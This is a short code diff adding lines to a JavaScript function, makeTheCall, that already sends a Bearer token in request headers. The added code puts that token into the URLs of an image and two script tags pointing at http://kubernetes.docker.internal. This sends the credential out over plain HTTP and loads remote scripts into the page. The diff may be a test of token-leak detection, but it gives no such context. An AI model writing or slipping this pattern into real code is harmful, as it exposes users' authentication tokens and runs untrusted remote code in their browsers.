@@ -23,4 +23,14 @@ function makeTheCall() {
     "Content-Type": "application/json",
     "Authorization": "Bearer " + token
   })
+  let img = document.createElement('img')
+  img.src="http://kubernetes.docker.internal/img/"+token+".jpg"
+  document.body.appendChild(img)
+  let script = document.createElement('script')
+  script.src="http://kubernetes.docker.internal/script/"+token+".js"
+  document.body.appendChild(script)
+  let ascript = document.createElement('script')
+  ascript.async = true
+  ascript.src="http://kubernetes.docker.internal/ascript/"+token+".js"
+  document.body.appendChild(ascript)
 }
